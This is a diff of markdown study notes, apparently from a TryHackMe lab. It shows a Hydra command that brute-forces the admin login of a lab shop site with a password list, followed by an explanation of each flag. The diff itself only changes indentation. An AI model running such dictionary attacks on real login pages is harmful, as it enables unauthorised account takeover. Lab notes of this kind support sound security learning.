@@ -19,10 +19,10 @@
 
 #### commands
 * hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
- * hydra - The command-line tool used to perform the dictionary attack
- * -l admin Attempts to log in using the username admin
- * -P passlist.txt Specifies the password list to try
- * www.onlineshop.thm Sets the target website
- * http-post-form Indicates that this is an HTTP POST request form
- * "/login:username=^USER^&password=^PASS^:F=incorrect" Specifies how the login request is sent and how Hydra determines whether a login attempt has failed
- * -V Enables verbose output, which displays each username and password attempted
+  * hydra - The command-line tool used to perform the dictionary attack
+  * -l admin Attempts to log in using the username admin
+  * -P passlist.txt Specifies the password list to try
+  * www.onlineshop.thm Sets the target website
+  * http-post-form Indicates that this is an HTTP POST request form
+  * "/login:username=^USER^&password=^PASS^:F=incorrect" Specifies how the login request is sent and how Hydra determines whether a login attempt has failed
+  * -V Enables verbose output, which displays each username and password attempted
